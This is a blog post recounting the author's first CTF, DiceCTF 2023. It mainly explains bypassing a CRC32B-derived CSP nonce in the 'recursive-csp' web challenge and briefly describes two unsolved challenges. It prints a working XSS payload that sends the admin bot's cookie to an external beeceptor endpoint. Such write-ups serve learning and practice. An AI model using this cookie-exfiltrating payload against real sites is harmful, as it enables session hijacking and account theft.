---
title: "DiceCTF 2023 Writeup"
date: 2023-02-11T09:47:42-08:00
description: My DiceCTF challenge experiences. What I learned and what cool things I found out.
images:
  - images/2023-02-11/solved-screenshot.png
tags:
  - ctf
  - security
type: post
---

Hello! 

DiceGang 🎲 just finished hosting DiceCTF 2023 (https://ctf.dicega.ng). It was first my first ever CTF event. I didn't really have any expectations going in and signed up on a whim. But guess what? I managed to solve one of the challenges and even gave a couple others a shot. I learned a ton from this event, and I'm definitely going to attend more CTF events in the future. 

Here are the my write ups.

### web/recursive-csp
* solved
* solves: 178
* description: the nonce isn't random, so how hard could this be? (the flag is in the admin bot's cookie)

We are greeted with a simple Hello World and a input for name. The form is simple, it will submit a `GET` request with `name` as query parameter. The new page returned by the document will have "Hello \"Name\"" instead. It was screaming XSS to me, so I just randomly inputting possible XSS attacks. But none of the `<script>` code was executing. Looking at the console error, it was blocked by the CSP header.
```
Content Security Policy: The page’s settings blocked the loading of a resource at inline (“script-src”).
```

The CSP header (`content-security-policy: default-src 'none'; script-src 'nonce-fe26ee76' 'unsafe-inline'; base-uri 'none';`) is only allowing script with particular nonce! This matches up with the hint. I started looking at how the nonce is generated by the server. At the first, I thought it was using the whole document as the input for hashing, and then only to realized that only the `name` parameter was used for input. This took way longer than I want to admit. Now I know what the server was using for the input, I need to know what kind of algorithm it is using. The nonce is always 8 characters so I started looking at any algorithm that will output 8 characters. This also took a really long time. Until I finally found a site: https://md5calc.com. I used to test md5 and other algorithms I know. What's cool about this site is that it outputs string encoded with other popular algorithms. This is how I found "CRC32B" 

> Future self here: it seems like CRC32B is a common hashing function provided by PHP.

Now I know how the server generate the nonce, I just need to somehow force it to match with my XSS. I wrote a simple js script to output `<script nonce="{input}">alert(1)</script>` where I replaced the "{input}" with a 8 characters random string and hoped the CRC32B hashing will return the same thing. My script didn't work and I was stuck. It was not able even brute force one match for me. 

I began searching online for a way to brute force it, and luckily stumbled upon this blog post by [Nayuki][Nayuki] https://www.nayuki.io/page/forcing-a-files-crc-to-any-value. The blog explains in details how the math works. To summarize it, the script adds 4 extra bytes to match the provided hash. This was really cool. I experimented with the script and found out some bytes that are injected are not URI friendly so I have to re-hash it again with a different value.

Since the CSP prevents and network request to send the cookie to an endpoint, I use `document.location` to change the headless admin bot to hope that it will redirect before it close the page. To my surprise it worked. At the end, I wrote a script to automate finding out the hash. Since the flag is in admin's cookie. We will need to use the admin bot. 

Here is my final payload
```html
<script nonce="55ed1ba5">document.location="https://adice.free.beeceptor.com?c="+document.cookie</script>  uO91
```

> Future self here: `https://beeceptor.com` was a site I used to get a temporary endpoint. However, reading everyone else's write up it seemed like `https://webhook.site` is what people usually use. 


Honestly, I faced a lot of difficulties during the whole process like figuring out the hash algorithm, troubleshooting why the random bytes weren't working, and understanding how the admin bot operates. It took me roughly 15 hours to solve this challenge, but even if I hadn't, it would still have been worth the effort. The amount of joy when I saw the `flag` was indescribable.


{{< figure
    src="/images/2023-02-11/solved-screenshot.png"
    alt="A solved screenshot for recursive-csp challenge"
>}}

Here is the author [strellic][strellic]'s writeup. He wrote a simple rust program to force the output which is super fast than my javascript version! It also worked a lot better. Additionally, the author created three more awesome challenges that are worth checking out!


## Unsolved challenge 

I attempted other challenges but couldn't solve them. Here are notes to myself for studying and documenting what I attempted.

### web/scorescope
* solves: 55
* description: I'm really struggling in this class. Care to give me a hand?

This challenge has a file named `template.py`, we need to implement all the functions and upload to the site for grading. It felt like university homework. The test cases included a `hidden` case so users couldn't guess it anyway. I couldn't solve this. I don't use python regularly. But here is a good write up by [r3kapig][r3kapig]

I learned a lot about exposing what the main module has and how to manipulate it.

### web/codebox
* solves: 30
* description: strellic makes csp challs, maybe i should try one sometime

This is another really cool challenge with CSP. It uses `report-uri` to leak information to an external server. It also a cool trick with how `URL()searchParams.get()` and `express`'s `req.query` handle multiple parameters with the same key. `URL` uses the first and `express` uses the last. This is mind blowing 🤯. I didn't know even think this was possible, I assume everything follow a standard.

[r3kapig][r3kapig] also solved it with detail write up. 



## Conclusion

This was my first ever CTF event, I am really proud that I even solved 1 challenge. I learned a lot by participating the event.

Here are things that I learned:
* Amazing people/groups to follow: [strellic][strellic], [ankursundara][ankursundara], [r3kapig][r3kapig], [Nayuki][Nayuki]
* What is a Content Security Policy header and how to use it.
* What is CRC32 hashing algorithm.
* [pwntool](https://github.com/Gallopsled/pwntools) to interact with server. Useful for scripting and parsing the output.


There are plenty more things that I won't list here. That's about it, thank you for reading. 


[strellic]: https://twitter.com/Strellic_
[ankursundara]: https://twitter.com/ankursundara
[r3kapig]: https://twitter.com/r3kapig
[Nayuki]: https://www.nayuki.io
